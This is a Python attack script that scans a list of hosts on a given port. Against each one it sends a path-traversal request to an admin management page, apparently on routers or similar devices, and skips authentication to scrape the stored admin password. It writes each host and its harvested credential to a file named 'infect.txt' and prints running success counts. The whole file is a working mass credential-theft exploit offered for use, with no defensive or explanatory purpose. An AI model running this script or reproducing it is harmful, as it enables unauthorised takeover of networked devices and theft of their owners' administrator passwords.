import sys
import time
import requests
import threading

port = 0
config = {
	"tried": 0,
	"success": 0,
	"failed": 0
}

def titlewrite():
	while(True):
		_str = ""
		for item, value in config.items():
			_str += "%s: %d | " %(item, value)
		print(_str)
		time.sleep(1)

def get_pass(address):
	try:
		ret = requests.get("http://" + address + ":" + port + "\\.gif\\..\\adm\\management.asp", headers={
			"Host": "" + address + ":" + port + "",
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Encoding": "deflate, gzip, identity",
			"Accept-Language": "en-US;q=0.6,en;q=0.4",
			"Referer": "http://" + address + ":" + port + "/",
			"User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
		})

		config['tried'] += 1
		if(ret.status_code == 200):
			if(len(ret.text.split('name="admpass"')[1].split("</td>")[0].split("value=")[1].strip('"').strip('">')) > 0):
				config['success'] += 1
				_str = address + " admin:" + ret.text.split('name="admpass"')[1].split("</td>")[0].split("value=")[1].strip('"').strip('">') + "\n"
				with open("infect.txt", "a") as fp:
					fp.write(_str)
		else:
			config['failed'] += 1

	except(Exception):
		pass

try:
	port = sys.argv[2]
	threading.Thread(target=titlewrite).start()
	with open(sys.argv[1], "r") as fp:
		for line in fp.readlines():
			threading.Thread(target=get_pass, args=(line.strip(), )).start()
except(IndexError):
	print("Usage: " + sys.argv[0] + " (list)")
